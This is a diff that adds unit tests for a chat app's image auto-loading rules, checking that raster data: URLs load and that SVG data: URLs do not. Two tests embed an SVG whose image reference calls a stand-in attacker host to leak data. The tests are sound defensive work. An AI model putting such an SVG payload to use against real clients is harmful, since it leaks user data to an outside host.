@@ -68,12 +68,47 @@ describe('allowedImageHosts', () => {
   })
 })
 
+const svgWithRemoteRef = (payload: string) =>
+  `data:image/svg+xml;base64,${Buffer.from(payload).toString('base64')}`
+
 describe('loadsAutomatically', () => {
-  it('loads data: URLs and the app media route always', () => {
+  it('loads a raster data: URL and the app media route always', () => {
     expect(loadsAutomatically('data:image/png;base64,abc', null)).toBe(true)
     expect(
       loadsAutomatically(`${BASE_URL}/api/v1/media/chat-1/img.png`, null)
     ).toBe(true)
+  })
+
+  it('loads every raster MIME type', () => {
+    for (const mime of [
+      'image/png',
+      'image/jpeg',
+      'image/jpg',
+      'image/gif',
+      'image/webp',
+      'image/avif'
+    ]) {
+      expect(loadsAutomatically(`data:${mime};base64,abc`, null)).toBe(true)
+    }
+  })
+
+  it('matches the data: MIME case-insensitively', () => {
+    expect(loadsAutomatically('DATA:IMAGE/PNG;BASE64,abc', null)).toBe(true)
+    expect(loadsAutomatically('Data:Image/Png,abc', null)).toBe(true)
+  })
+
+  it('never auto-loads an SVG data: URL — it can resolve its own remote references', () => {
+    const svg = svgWithRemoteRef(
+      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://attacker.example/?leak=1"/></svg>'
+    )
+    expect(loadsAutomatically(svg, null)).toBe(false)
+  })
+
+  it('never auto-loads a data: URL with another, missing, or malformed MIME', () => {
+    expect(loadsAutomatically('data:text/html,<b>hi</b>', null)).toBe(false)
+    expect(loadsAutomatically('data:,hello', null)).toBe(false)
+    expect(loadsAutomatically('data:image/png', null)).toBe(false)
+    expect(loadsAutomatically('data:image/png;base64', null)).toBe(false)
   })
 
   it('loads an https image from an allowed host only', () => {
@@ -102,6 +137,21 @@ describe('<RemoteImage>', () => {
       'data:image/png;base64,abc'
     )
     expect(host.querySelector(`[data-testid]`)).toBeNull()
+  })
+
+  it('renders a placeholder (no <img>) for an SVG data: URL, labelled "inline image"', async () => {
+    const svg = svgWithRemoteRef(
+      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://attacker.example/?leak=1"/></svg>'
+    )
+    const { host, root, tree } = render(svg, 'a pic')
+    await act(async () => root.render(tree))
+    expect(host.querySelector('img')).toBeNull()
+    const placeholder = host.querySelector(
+      `[data-testid="${TEST_IDS.chat.remoteImage.placeholder}"]`
+    )
+    expect(placeholder).not.toBeNull()
+    expect(placeholder?.textContent).toContain('remoteImage.inlineImage')
+    expect(placeholder?.textContent).not.toContain('attacker.example')
   })
 
   it('renders <img> for the app media route', async () => {
